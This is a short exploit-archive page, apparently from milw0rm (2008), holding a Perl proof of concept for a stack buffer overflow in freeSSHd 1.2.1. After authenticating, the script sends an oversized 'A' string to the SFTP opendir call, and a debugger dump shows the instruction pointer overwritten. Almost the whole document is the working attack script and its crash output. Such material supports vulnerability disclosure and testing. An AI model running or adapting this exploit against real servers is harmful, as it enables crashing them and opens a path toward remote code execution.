<html><head><title>freeSSHd 1.2.1 Remote Stack Overflow PoC (auth)</title></head><pre>###############################################################################
#  FreeSSHD remote Buffer Overflow
#
# Website: http://freesshd.com/
#
# Version:1.2.1
#
# Bug: Remote Buffer Overflow ( CD)
#
#First chance exceptions are reported before any exception handling.
#This exception may be expected and handled.
#eax=00000001 ebx=00000000 ecx=41414141 edx=00150608 esi=00c268f0 edi=00c268f0
#eip=41414141 esp=00127c10 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
#41414141 ??              ???
#
# Poc:
 

use strict;
use Net::SSH2;
my $ip=&quot;127.0.0.1&quot;;
my $port=22;
my $user=&quot;YOUR_USER&quot;;
my $pass=&quot;YOUR_PASS&quot;;
my $ssh2 = Net::SSH2-&gt;new();
my $payload =&quot;A&quot; x 4098;
$ssh2-&gt;connect($ip, $port) || die &quot;could not connect&quot;;
$ssh2-&gt;auth_password($user,$pass)|| die &quot;wrong passwd/login&quot;;
print &quot;Poc running ...\n&quot;;
my $sftp = $ssh2-&gt;sftp();
my $dir = $sftp-&gt;opendir($payload);
print &quot;Buffer Overflow Successfull\n&quot;;
$ssh2-&gt;disconnect();
exit;

# milw0rm.com [2008-05-31]</pre></html>